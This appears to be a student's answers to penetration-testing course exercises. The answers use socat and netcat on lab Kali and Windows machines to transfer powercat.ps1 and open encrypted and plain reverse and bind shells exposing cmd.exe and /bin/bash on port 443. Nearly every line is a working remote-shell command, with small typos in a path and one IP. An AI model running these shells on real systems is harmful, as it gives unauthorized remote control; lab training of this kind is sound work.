

# 4.2.4.1.1
Use socat to transfer powercat.ps1 from your Kali machine to your Windows system. Keep the file on your system for use in the next section.  
  
  
Linux - Send file:
```bash
sudo socat TCP4-LISTEN:443,fork file:/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1
```

Windows - Recieve file:  
```powershell
socat TCP4:192.168.119.166:443 file:powercat.ps1,create
```



# 4.2.4.1.2
Use socat to create an encrypted reverse shell from your Windows system to your Kali machine.  
  
Linux - Create self-signed SSL cert & Send to Windows:  
```bash
mkdir ~/Documents/Exercises/4.2.4.1 && cd ~/Documents/Exersices/4.2.4.1  
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt  
cat bind_shell.key bind_shell.crt > bind_shell.pem  
sudo socat TCP4-LISTEN:443,fork file:bind_shell.pem
```

Windows - Recieve .pem:  
```powershell
socat TCP4:198.162.119.166:443 file:bind_shell.pem,create
```


**Reverse shell:**  
  
Windows - Create encrypted reverse shell:  
```powershell
socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0 EXEC:'cmd.exe',pipes
```

Linux - Connect to reverse shell:  
```bash
socat - OPENSSL:192.168.166.10:443,verify=0
```


**Bind shell:**  
  
Linux - Establish encrypted bind listener:  
```bash
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```

Windows - Establish encrypted bind shell:  
```powershell
socat - OPENSSL:192.168.119.166:443,verify=0
```

  
  
# 4.2.4.1.3 
Create an encrypted bind shell on your Windows system. Try to connect to it from Kali without encryption. Does it still work? **- No**  
  
Windows - Establish encrypted listener:  
```powershell
socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0 EXEC:'cmd.exe',pipes
```

Linux - Attempt non-secure connection:  
```bash
socat - TCP4:192.168.166.10:443
```

  
  
  
  
4. Make an unencrypted socat bind shell on your Windows system. Connect to the shell using Netcat. Does it work? **- Yes**  
  
Windows - Create socat listener on 443:  

socat -d -d TCP4-LISTEN:443 EXEC:'cmd.exe',pipes

  
  
  
Linux - Attempt nc connection:  

nc 192.168.166.10 443